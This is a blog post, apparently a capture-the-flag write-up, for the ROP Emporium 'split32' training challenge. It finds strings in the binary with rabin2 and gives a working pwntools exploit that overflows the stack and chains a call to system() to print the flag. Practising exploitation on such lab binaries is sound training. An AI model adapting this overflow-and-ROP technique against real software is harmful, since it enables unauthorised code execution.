---
layout: post
title: ROP Emporium - split32
---

### Prev step to overflow stack
<https://bhrdn.github.io/ROP-Emporium-ret2win32/>

### Find useful string
```bash
rabin2 -z split32
```

```
[Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
000 0x000006f0 0x080486f0  21  22 (.rodata) ascii split by ROP Emporium
001 0x00000706 0x08048706   7   8 (.rodata) ascii 32bits\n
002 0x0000070e 0x0804870e   8   9 (.rodata) ascii \nExiting
003 0x00000718 0x08048718  43  44 (.rodata) ascii Contriving a reason to ask user for data...
004 0x00000747 0x08048747   7   8 (.rodata) ascii /bin/ls
000 0x00001030 0x0804a030  17  18 (.data) ascii /bin/cat flag.txt
```

- 0x08048747 : /bin/ls
- 0x0804a030 : /bin/cat flag.txt

### Payload
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('split32')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

payload = '\x90' * cyclic_find('laaa')

FLAG = 0x0804a030

rop = ROP(exe)
rop.system(FLAG)

io.sendline(payload + rop.__str__())
io.interactive()
```